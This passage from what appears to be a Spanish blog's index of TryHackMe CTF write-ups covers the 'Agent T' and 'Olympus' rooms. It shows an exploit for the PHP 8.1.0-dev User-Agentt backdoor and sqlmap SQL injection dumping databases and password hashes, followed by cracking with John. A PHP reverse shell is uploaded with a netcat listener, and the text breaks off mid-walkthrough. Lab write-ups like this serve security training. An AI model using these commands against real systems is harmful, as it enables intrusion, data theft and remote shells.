trasera el 28 de marzo de 2021, pero la puerta trasera fue rápidamente descubierta y eliminada. Si esta versión de PHP se ejecuta en un servidor, un atacante puede ejecutar código arbitrario enviando la cabecera User-Agentt. El exploit propuesto utiliza un backdoor para obtener una pseudo shell en el host.Toca intentarlo mientras el nombre del room va adquiriendo sentido ;)Podemos descargar el exploit directamente de la web a nuestro directorio de trabajo o buscarlo en local y copiarlo. Va en gustos.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]└─$ searchsploit 8.1.0-dev ------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution | php/webapps/49933.py------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------Shellcodes: No Results┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]└─$ locate 49933.py/usr/share/exploitdb/exploits/php/webapps/49933.py┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]└─$ cp /usr/share/exploitdb/exploits/php/webapps/49933.py .Lo abrimos en nuestro editor preferido y le echamos un ojo. El cacharro tira de python3 y al ejecutarlo nos pedirá que le pasemos la dirección del host. Le damos amor.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]└─$ python3 49933.py Enter the full host url:http://10.10.105.111/Interactive shell is opened on http://10.10.105.111/ Can't acces tty; job crontol turned off.$ Dentro. El tema en este caso, según la docu, es que tenemos una pseudo shell, es decir, una shell con ciertas características particulares … pero menos da una piedra. A ver qué podemos rascar.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]└─$ python3 49933.py Enter the full host url:http://10.10.105.111/Interactive shell is opened on http://10.10.105.111/ Can't acces tty; job crontol turned off.$ whoamiroot$ pwd/var/www/html$ ls -latotal 760drwxr-xr-x 1 root root 4096 Mar 7 22:03 .drwxr-xr-x 1 root root 4096 Mar 30 2021 ..-rw-rw-r-- 1 root root 199 Mar 5 22:33 .travis.yml-rw-rw-r-- 1 root root 22113 Mar 5 22:33 404.html-rw-rw-r-- 1 root root 21756 Mar 5 22:33 blank.htmldrwxrwxr-x 2 root root 4096 Mar 5 22:33 css-rw-rw-r-- 1 root root 3784 Mar 5 22:33 gulpfile.jsdrwxrwxr-x 2 root root 4096 Mar 5 22:33 img-rw-rw-r-- 1 root root 42145 Mar 7 21:48 index.phpdrwxrwxr-x 3 root root 4096 Mar 5 22:33 js-rw-rw-r-- 1 root root 642222 Mar 5 22:33 package-lock.json-rw-rw-r-- 1 root root 1493 Mar 5 22:33 package.jsondrwxrwxr-x 4 root root 4096 Mar 5 22:33 scssdrwxrwxr-x 8 root root 4096 Mar 5 22:33 vendor$ cd ..$ pwd/var/www/html$ cd /$ pwd/var/www/html$OK, Somos root y cd no funciona para poder movernos. No pasa nada, tiramos de ls para trastear directorios.$ ls -la / total 76drwxr-xr-x 1 root root 4096 Mar 7 22:03 .drwxr-xr-x 1 root root 4096 Mar 7 22:03 ..-rwxr-xr-x 1 root root 0 Mar 7 22:03 .dockerenvdrwxr-xr-x 1 root root 4096 Mar 30 2021 bindrwxr-xr-x 2 root root 4096 Nov 22 2020 bootdrwxr-xr-x 5 root root 340 Aug 8 13:56 devdrwxr-xr-x 1 root root 4096 Mar 7 22:03 etc-rw-rw-r-- 1 root root 38 Mar 5 22:33 flag.txtdrwxr-xr-x 2 root root 4096 Nov 22 2020 homedrwxr-xr-x 1 root root 4096 Mar 30 2021 libdrwxr-xr-x 2 root root 4096 Jan 11 2021 lib64drwxr-xr-x 2 root root 4096 Jan 11 2021 mediadrwxr-xr-x 2 root root 4096 Jan 11 2021 mntdrwxr-xr-x 2 root root 4096 Jan 11 2021 optdr-xr-xr-x 157 root root 0 Aug 8 13:56 procdrwx------ 2 root root 4096 Jan 11 2021 rootdrwxr-xr-x 3 root root 4096 Jan 11 2021 rundrwxr-xr-x 2 root root 4096 Jan 11 2021 sbindrwxr-xr-x 2 root root 4096 Jan 11 2021 srvdr-xr-xr-x 13 root root 0 Aug 8 13:56 sysdrwxrwxrwt 1 root root 4096 Mar 30 2021 tmpdrwxr-xr-x 1 root root 4096 Jan 11 2021 usrdrwxr-xr-x 1 root root 4096 Mar 30 2021 var$ A la primera y damos con el fichero flag.txt. Sin duda ha sido suerte.[...]$ cat /flag.txtflag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}$Bingo.FinalLo cierto es que la cosa no ha sido muy difícil esta vez. Para los más curiosos, podéis intentar manipular las cabeceras HTTP con Burp Suite o OWASP ZAP, los más temerarios incluso con curl.Espero que esta guía os haya resultado de utilidad. Contactarme por Twitter si consideráis que os puedo ayudar con algo.Sed buenos si no hay una opción mejor." }, { "title": "Try Hack Me - Olympus - Writeup", "url": "/posts/thm-writeup-olympus/", "categories": "Try Hack Me", "tags": "thm, writeups", "date": "2022-08-04 02:30:00 +0100", "snippet": "En esta guía vamos a trabajar con la máquina Olympus disponible en THM, un interesante CTF de dificultad media creado por G4vr0ch3 en el que pondremos en práctica técnicas de enumeración, SQLi y escalado de privilegios entre otras curiosidades.Dentro música.Inicio Disclaimer: algunos de estos primeros pasos que menciono a continuación son opcionales y solo reflejan mi modo de trabajar. Cada uno debería aplicar el propio.Lo primero es conectar nuestra máquina local con THM via VPN para poder atacar desde nuestro equipo a la máquina del room.┌──(ewan67㉿kali)-[~]└─$ sudo openvpn /home/ewan67/VPN_certs/THM_ewan67.ovpnIniciamos la máquina remota dando al botón  Start MachineAbrimos otro terminal en local, creamos la carpeta de trabajo, nos posicionamos en ella y creamos un fichero de notas en el que iremos apuntando información relevante a lo largo del proceso. En mi caso:┌──(ewan67㉿kali)-[~]└─$ cd Cybersecurity/THM┌──(ewan67㉿kali)-[~/Cybersecurity/THM]└─$ mkdir Olympus┌──(ewan67㉿kali)-[~/Cybersecurity/THM]└─$ cd Olympus┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ touch notas┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ echo \"Notas Olympus\" &gt; notas┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ cat notasNotas OlympusCon la conexión VPN establecida y la máquina remota iniciada, copiamos las IPs que aparecen en la página de THM correspondientes a nuestro equipo y al server remoto. Esto lo hago por costumbre para no tener que estar escribiéndolas cada vez que necesite utilizarlas en algun comando. En mi caso:┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ LIP=10.18.xx.xx &lt;- la IP de mi equipo via OpenVPN┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ RIP=10.10.129.191 &lt;- la IP de la máquina remotaReconocimiento &amp; EnumeraciónEn el propio room nos sugiere el autor que empecemos enumerando el server así que vamos con ello.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ nmap -A $RIP -oN nmap_outputSignificado de las flags: -A : escaneo completo (ejecuta OS detection, version detection, script scanning y traceroute) -oN : imprime la salida en un fichero de texto con el nombre nmap_outputAbrimos el fichero con la salida de nmap en nuestro editor preferido y le echamos un ojo. Qué nos está contando ? que la máquina tiene dos puertos abiertos: el 22/tcp (ssh) y el 80/tcp (http). que corre un Ubuntu. que en el puerto 80 hay un Apache/2.4.41 (Ubuntu) escuchando con una redirección 302 contra http://olympus.thm Probamos a cargar en el navegador la IP del server …No rula. Se confirma la redirección. Toca modificar el fichero etc/hosts  de nuestro equipo para resolver la IP añadiendo la siguiente entrada.10.10.129.191\tolympus.thmVolvemos a probar desde el navegador …OK. Empezamos aplicando el procedimiento estandar de reconocimiento manual cuando nos enfrentamos a un sitio web, a saber: echamos un ojo a lo que nos muestra, seguimos enlaces, analizamos URLs, probamos funcionalidades, completamos formularios, lanzamos búsquedas, etc, etc; en resumen: trasteamos con él a ver qué nos dice. En nuestro caso no hay mucho donde rascar, pero la index incluye un mensaje que nos vale como primera pista: The old version of the website is still accessible on this domain. echamos un ojo al código fuente en busca de comentarios, formularios, nombre del framework, ficheros .js con contenido interesante como llamadas asíncronas, estructura de directorios a partir de los links, etc, etc. apuntamos todo lo que nos parezca relevante en nuestro fichero de bitácora notas.Tras el reconocimiento manual, la artillería.Para escanear el server tenemos varias herramientas a nuestra disposición: dirb, dirbuster, gobaster, nikto y un largo etc. En este caso vamos a utilizar dos de mis tools preferidas: ffuf y feroxbuster, ambas disponibles en el repositorio de Kali.Empezamos con ffuf …┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ ffuf -u http://olympus.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -t 100 -o ffuf_output -of mdSignificado de las flags: -u : la URL que queremos escanear. -w : la ubicación del diccionario. -c : para colorear la salida. -t : nro de hilos concurrentes (por defecto son 40). -o : nombre del fichero donde almacenaremos la salida. -of : formato del fichero de salida, md en nuestro caso.Abrimos el fichero y le echamos un ojo. /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3________________________________________________ :: Method : GET :: URL : http://olympus.thm/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt :: Output file : ffuf_output :: File format : json :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 100 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500________________________________________________.htaccess [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 75ms].htpasswd [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 75ms].hta [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 75ms]index.php [Status: 200, Size: 1948, Words: 238, Lines: 48, Duration: 41ms]javascript [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 45ms]phpmyadmin [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 35ms]server-status [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 46ms]static [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 57ms]~webmaster [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 45ms]:: Progress: [4713/4713] :: Job [1/1] :: 1053 req/sec :: Duration: [0:00:03] :: Errors: 0 ::Qué nos cuenta el fuzzeo ? … el último directorio de la lista no es habitual, tendrá relación con lo el mensaje de la index “The old version of the website …” ?Vamos con feroxbuster …┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ feroxbuster -u http://olympus.thm/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -t 100 -o feroxbuster_outputSignificado de las flags: -u : la URL que queremos escanear. -w : la ubicación de nuestro fichero de wordlist. -e : le pedimos que extraiga enlaces del cuerpo de la respuesta y realice nuevas peticiones en función de los resultados. -t : nro de hilos concurrentes. -o : nombre del fichero donde almacenaremos la salida.La velocidad y la cantidad de info que vuelca esta herramienta son una verdadera pasada, volviéndola una alternativa más que interesante a venerables clásicos del rock como dirb, gobuster y cía.Echamos un ojo al fichero que nos ha generado.[...]301 GET 9l 28w 332c http://olympus.thm/~webmaster/admin/js/plugins =&gt; http://olympus.thm/~webmaster/admin/js/plugins/301 GET 9l 28w 332c http://olympus.thm/~webmaster/admin/js/tinymce =&gt; http://olympus.thm/~webmaster/admin/js/tinymce/[####################] - 42s 42708/42708 0s found:129 errors:1189 [####################] - 14s 4714/4714 328/s http://olympus.thm/ [####################] - 19s 4714/4714 241/s http://olympus.thm/javascript [####################] - 7s 4714/4714 0/s http://olympus.thm/static/images/ =&gt; Directory listing[####################] - 0s 4714/4714 0/s http://olympus.thm/static/ =&gt; Directory listing[####################] - 7s 4714/4714 0/s http://olympus.thm/static/images =&gt; Directory listing[####################] - 0s 4714/4714 0/s http://olympus.thm/static =&gt; Directory listing[####################] - 23s 4714/4714 204/s http://olympus.thm/~webmaster [####################] - 29s 4714/4714 160/s http://olympus.thm/~webmaster/admin [####################] - 22s 4714/4714 218/s http://olympus.thm/javascript/jquery [####################] - 0s 4714/4714 0/s http://olympus.thm/~webmaster/css =&gt; Directory listing[####################] - 15s 4714/4714 0/s http://olympus.thm/~webmaster/fonts =&gt; Directory listing[####################] - 4s 4714/4714 0/s http://olympus.thm/~webmaster/fonts/material-icons =&gt; Directory listing[####################] - 17s 4716/4714 285/s http://olympus.thm/~webmaster/img [####################] - 0s 4714/4714 0/s http://olympus.thm/~webmaster/includes =&gt; Directory listing[####################] - 10s 4714/4714 0/s http://olympus.thm/~webmaster/admin/js/ =&gt; Directory listing[####################] - 8s 4714/4714 0/s http://olympus.thm/~webmaster/js =&gt; Directory listing[####################] - 0s 4714/4714 0/s http://olympus.thm/~webmaster/includes/ =&gt; Directory listing[####################] - 22s 4714/4714 215/s http://olympus.thm/~webmaster/img/cgi-bin/ [####################] - 0s 4714/4714 0/s http://olympus.thm/~webmaster/admin/css =&gt; Directory listing[####################] - 2s 4714/4714 0/s http://olympus.thm/~webmaster/admin/fonts =&gt; Directory listing[####################] - 1s 4714/4714 0/s http://olympus.thm/~webmaster/admin/img =&gt; Directory listing[####################] - 1s 4714/4714 0/s http://olympus.thm/~webmaster/admin/includes =&gt; Directory listing[####################] - 0s 4714/4714 0/s http://olympus.thm/~webmaster/admin/css/ =&gt; Directory listing[####################] - 16s 4714/4714 288/s http://olympus.thm/~webmaster/admin/js [####################] - 14s 4714/4714 332/s http://olympus.thm/~webmaster/ [####################] - 0s 4714/4714 0/s http://olympus.thm/~webmaster/js/ =&gt; Directory listing[####################] - 0s 4714/4714 0/s http://olympus.thm/~webmaster/css/ =&gt; Directory listing[####################] - 8s 4714/4714 0/s http://olympus.thm/~webmaster/fonts/roboto =&gt; Directory listingEl directorio ~webmaster  nos está llamando a gritos, así que vamos a ello.Cargamos en el navegador la URLhttp://olympus.thm/~webmastery accedemos a esto …Bajamos hasta el final de la página …Toca trastear. Sed buenos y hacedlo antes de continuar leyendo ;)Qué info hemos conseguido ? El título de la página y la primera entrada del menú horizontal superior nos hablan de un tal Victor`s CMS. Búsqueda en Google y los primeros 6 resultados son un festín de vulnerabilidades, exploits y demás alegrías, tanto que cuesta enterarse de que se trata de “A Simple Content Management System” creado por Victor Alagwu. Pinchando en cualquiera del resto de opciones del menu superior nos carga la página /category.php  pasando un parametro GET ?cat_id=1  … ya veremos que se puede rascar de aquí. Si en el input del Search que aparece al final de la página metemos una sencilla comilla simple y le damos a buscar conseguimos que nos devuelva un error de SQL y parte de la query en cuestión en la página /search.php . Menos da una piedra. Enviando el formulario de Login nos carga /includes/login.php  … una página en blanco con algo de info en el códido fuente. Visto lo visto sobre nuestro amigo Victor, a por un exploit de primero.Análisis de vulnerabilidadesBuscamos en nuestro equipo.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ searchsploit victor cms------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------Victor CMS 1.0 - 'add_user' Persistent Cross-Site Scripting | php/webapps/48511.txtVictor CMS 1.0 - 'cat_id' SQL Injection | php/webapps/48485.txtVictor CMS 1.0 - 'comment_author' Persistent Cross-Site Scripting | php/webapps/48484.txtVictor CMS 1.0 - 'post' SQL Injection | php/webapps/48451.txtVictor CMS 1.0 - 'Search' SQL Injection | php/webapps/48734.txtVictor CMS 1.0 - 'user_firstname' Persistent Cross-Site Scripting | php/webapps/48626.txtVictor CMS 1.0 - Authenticated Arbitrary File Upload | php/webapps/48490.txtVictor CMS 1.0 - File Upload To RCE | php/webapps/49310.txtVictor CMS 1.0 - Multiple SQL Injection (Authenticated) | php/webapps/49282.txt------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------Shellcodes: No ResultsEl segundo resultado nos refiere una posibilidad de SQLi sobre el parametro cat_id  y nos remite al fichero php/webapps/48485.txt  para mas detalles.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ locate 48485.txt/usr/share/exploitdb/exploits/php/webapps/48485.txt┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ cat /usr/usr/share/exploitdb/exploits/php/webapps/48485.txt# Exploit Title: Victor CMS 1.0 - 'cat_id' SQL Injection# Google Dork: N/A# Date: 2020-05-19# Exploit Author: Kishan Lal Choudhary# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite# Software Link: https://github.com/VictorAlagwu/CMSsite/archive/master.zip# Version: 1.0# Tested on: Windows 10Description: The GET parameter 'category.php?cat_id=' is vulnerable to SQL InjectionPayload: UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10+--http://localhost/category.php?cat_id=-1+UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10+--By exploiting the SQL Injection vulnerability by using the mentioned payload, an attacker will be able to retrieve the database name and version of mysql running on the server. El exploit nos cuenta que el CMS es vulnerable a SQLi y nos muestra el payload que podemos utilizar atacando al parametro GET cat_id  de la URL.Una opción es seguir el método de edición de URL que nos propone el exploit, otra a mi parecer más práctica y rápida: utilizar sqlmap. Nota: a partir de la información recopilada hasta aquí se nos presentan diversas vías para continuar avanzando. En nuestro caso, y en aras de la brevedad, solo nos centraremos en una. Otra opción con un recorrido similar, vinculada al input de búsqueda y la página /search.php  podéis consultarla aquí.ExplotaciónVamos con sqlmap.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' --dbsSignificado de las flags: -u : la URL target. -p : el parámetro que queremos atacar. --dbs : le pedimos que nos devuelva un listado de las Bases de Datos que encuentre.Le damos amor y nos devuelve lo siguiente:[...]available databases [6]:[*] information_schema[*] mysql[*] olympus[*] performance_schema[*] phpmyadmin[*] sys[...]Candidata al Oscar la db olympus, así que a por sus tablas.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus --tablesSignificado de las flags: -D : el nombre de la DB que queremos escanear. --tables : le pedimos que nos devuelva un listado de las tablas que encuentre.[...]Database: olympus[6 tables]+------------+| categories || chats || comments || flag || posts || users |+------------+[...]De un primer vistazo la tabla flag promete felicidad, vamos a por ella.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T flag --columnsSignificado de las flags: -T : el nombre de la tabla que queremos analizar. --columns : le pedimos que nos muestre la estructura de la tabla.[...]Database: olympusTable: flag[1 column]+--------+--------------+| Column | Type |+--------+--------------+| flag | varchar(255) |+--------+--------------+[...]Volcamos su contenido:┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T flag --dumpSignificado de las flags: --dump : nos vuelca los registros de la tabla.[...]Database: olympusTable: flag[1 entry]+---------------------------+| flag |+---------------------------+| flag{xxxxxxxxxxxxxxxxxxx} |+---------------------------+[...]Ha caído la primera.Del listado de tablas que nos ha devuelto sqlmap solo hemos sacado partido a la tabla flag, así que vamos a por user.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T users --columns[...]Database: olympusTable: users[9 columns]+----------------+--------------+| Column | Type |+----------------+--------------+| randsalt | varchar(255) || user_email | varchar(255) || user_firstname | varchar(255) || user_id | int || user_image | text || user_lastname | varchar(255) || user_name | varchar(255) || user_password | varchar(255) || user_role | varchar(255) |+----------------+--------------+[...]Nos traemos las columnas user_name, user_password y user_email┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T users -C user_name,user_password,user_email --dumpSignificado de las flags: -C : nos permite listar las columnas que nos queremos traer.[...]Database: olympusTable: users[3 entries]+------------+--------------------------------------------------------------+------------------------+| user_name | user_password | user_email |+------------+--------------------------------------------------------------+------------------------+| prometheus | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus@olympus.thm || root | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root@chat.olympus.thm || zeus | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus@chat.olympus.thm |+------------+--------------------------------------------------------------+------------------------+[...]Bien. Qué hemos conseguido ? Una relación de usuarios y hashes, guay. Pero qué más ? … Mirad con atención las direcciones de correo. Bingo ! … al parecer hay un subdominio en danza chat.olympus.thm … existirá realmente ? … estará operativo ? …A saber, pero antes de salir de dudas a ese respecto y aprovechando que estamos con sqlmap, si revisamos nuestras notas veremos que hay una tabla chats dentro de la DB olympus. Vamos a volcarla a ver qué nos cuenta.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T chats --dumpDatabase: olympusTable: chats[3 entries]+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+| dt | msg | file | uname |+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+| 2022-04-05 | Attached : prometheus_password.txt | 47c3210d51761686f3af40a875eeaaea.txt | prometheus || 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back... | &lt;blank&gt; | prometheus || 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | &lt;blank&gt; | zeus |+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+Bien. El dump nos ofrece una conjunto de registros con mensajes y algunos datos interesantes: El usuario prometheus ha atacheado un fichero con el nombre “prometheus_password.txt”, pero al intentar descargarlo de la “upload folder”, no ha podido. Al parecer el fichero ha sufrido algun tipo de “modificación”. El usuario zeus le responde contándole que el “IT guy” ha implementado una función que modifica el nombre de los ficheros de manera aleatoria, antes de almacenarlos, con el objetivo de dificultar el acceso a posibles atacantes. Un nombre de fichero “47c3210d51761686f3af40a875eeaaea.txt” aparece asociado al registro del envío de “prometheus_password.txt” Podemos deducir de lo anterior que el sitio implementa algun tipo de función que modifica el nombre del fichero adjuntado por el usuario antes de almacenarlo en la “upload folder”, y registra este nombre modificado en el campo file de la tabla chats.Tareas ? … acceder a chat.olympus.thm, localizar la “upload folder” y ver si nuestra teoría es cierta intentando descargar el fichero “47c3210d51761686f3af40a875eeaaea.txt”. De confirmarlo: podremos aprovecharnos de ello con bondad infinita.Para confirmar que hay alguien escuchando en chat.olympus.thm via navegador lo primero es añadir la entrada correspondiente a nuestro etc/hosts10.10.129.191\tchat.olympus.thmSe carga la página chat.olympus.thm/login.php con un vistoso formulario de Login.Guay, el sitio está operativo. Toca sacarle partido a los registros de la tabla users para intentar logarnos. Pasamos al siguiente nivel: Cracking.CrackingA partir del volcado que tenemos de la tabla users creamos un fichero con los datos en formato …user:passworduser:passworduser:passwordLo guardamos con el nombre que queramos, por ejemplo users.hashes  y recurrimos a nuestro fiel amigo John The Ripper utilizando /usr/share/wordlists/rockyou.txt  como diccionario.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ john --wordlist=/usr/share/wordlists/rockyou.txt users.hashesTras un buen rato currando, John nos devuelve la respuesta. En este caso, solo ha podido resolver una de las claves.[...]0g 0:00:01:57 0.01% (ETA: 2022-08-08 04:10) 0g/s 18.98p/s 57.24c/s 57.24C/s allen..meandyouxxxxxxxxxx (prometheus)1g 0:00:05:47 0.04% (ETA: 2022-08-07 06:07) 0.002875g/s 20.59p/s 52.89c/s 52.89C/s gomez..flower2[...]Con éstas credenciales en la mano toca intentar dos cosas: Utilizarlas en el form de Login que viene al final de http://olympus.thm/~webmaster/index.php Utilizarlas en el form de Login de http://chat.olympus.thm/login.php Enumeración IIArrancamos con …Probamos y accedemos al dashboard del CMS …Toca trastear y ver lo que nos ofrece.Probamos con la web del chat:Buena pinta. Una página en la que aparecen los mensajes almacenados en la tabla chats.De las dos vías de avance que acabamos de abrir (el dashboard y el chat) vamos a trabajar con ésta última.Según la hoja de ruta que nos hemos dado toca lozalizar la “upload folder” e intentar descargarnos el fichero “47c3210d51761686f3af40a875eeaaea.txt”. Tiramos de feroxbuster para la primer tarea.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ feroxbuster -u http://chat.olympus.thm/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -t 100 -o feroxbuster_chat_output[...][####################] - 18s 18880/18880 0s found:28 errors:71 [####################] - 15s 4714/4714 302/s http://chat.olympus.thm/ [####################] - 9s 4714/4714 501/s http://chat.olympus.thm/javascript [####################] - 7s 4714/4714 0/s http://chat.olympus.thm/static =&gt; Directory listing[####################] - 7s 4714/4714 657/s http://chat.olympus.thm/javascript/jquery [####################] - 9s 4714/4714 515/s http://chat.olympus.thm/uploads [####################] - 8s 4714/4714 0/s http://chat.olympus.thm/static/images =&gt; Directory listingBien, el nombre de la “upload folder” parece ser … uploads … no se podía saber ;)Intentamos descargarnos el fichero.http://chat.olympus.thm/uploads/47c3210d51761686f3af40a875eeaaea.txtQué os parece el mensaje que nos da ?Cachondo el tío. Seguimos con nuestro plan y desde la vista del chat probamos a enviar un fichero .txt con una línea de texto cualquiera y el nombre “a.txt” por ejemplo. Lo enviámos y volvemos a sacar un volcado de la tabla chats Tip: si el dump no se actualiza añadir la flag --flush-session para refrescar la consulta.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T chats --dump[...]Database: olympusTable: chats[5 entries]+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+| dt | msg | file | uname |+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+| 2022-04-05 | Attached : prometheus_password.txt | 47c3210d51761686f3af40a875eeaaea.txt | prometheus || 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back... | &lt;blank&gt; | prometheus || 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | &lt;blank&gt; | zeus || 2022-08-04 | prueba | &lt;blank&gt; | prometheus || 2022-08-04 | Attached : a.txt | 012a4f36f3ba4e3c90e2606db849bfef.txt | prometheus |+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+Intentamos descargar el fichero que acabamos de subir utilizando el campo file del dump para ellohttp://chat.olympus.thm/uploads/012a4f36f3ba4e3c90e2606db849bfef.txtVale, sospechas confirmadas. Nuevas tareas: Subir una shell inversa en php que utilizaremos para establecer una conexión entre el server y nuestro equipo local. Repetir el dump contra chats para obtener el nombre con el que se ha almacenado nuetro fichero con la shell. Arrancar una escucha en local con netcat Pedir el fichero al server para forzar la conexión. Vamos a ello. Lo primero es localizar en nuestro Kali el fichero que necesitamos, copiarlo a nuestro directorio de trabajo y editarlo.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ tree /usr/share/webshells//usr/share/webshells/[...]|-- php| |-- findsocket| | |-- findsock.c| | `-- php-findsock-shell.php| |-- php-backdoor.php| |-- php-reverse-shell.php| |-- qsd-php-backdoor.php| `-- simple-backdoor.php[...]┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]└─$ cp /usr/share/webshells/php/php-reverse-shell.php .Abrimos el fichero php-reverse-shell.php en nuestro editor y modificamos los parámetros necesarios[...]$ip = '10.18.xx.xx'; // CHANGE THIS &lt;- nuestra IP local$port = 4321; // CHANGE THIS &lt;- el puerto en el que estaremos escuchando[...]Subimos el fichero php-reverse-shell.php al server valiéndonos de la página de chat y volvemos a volcar chatsDatabase: olympusTable: chats[7 entries]+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+| dt | msg | file | uname |+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+| 2022-04-05 | Attached : prometheus_password.txt | 47c3210d51761686f3af40a875eeaaea.txt | prometheus || 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back... | &lt;blank&gt; | prometheus || 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | &lt;blank&gt; | zeus || 2022-08-04 | prueba | &lt;blank&gt; | prometheus || 2022-08-04 | Attached : a.txt | 012a4f36f3ba4e3c90e2606db849bfef.txt | prometheus || 2022-08-04 | shell | &lt;blank&gt; | prometheus || 2022-08-04 | Attached : php-reverse-shell.php | 99e7c69732975b95791508afdabc5057.php | prometheus |+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+Abrimos una pestaña nueva en nuestro terminal e iniciamos netcatnc -lvnp 4321Significado de las flags: -l : listen mode. -v : verbose. -n : solo IP numéricas, no DNS. -p : 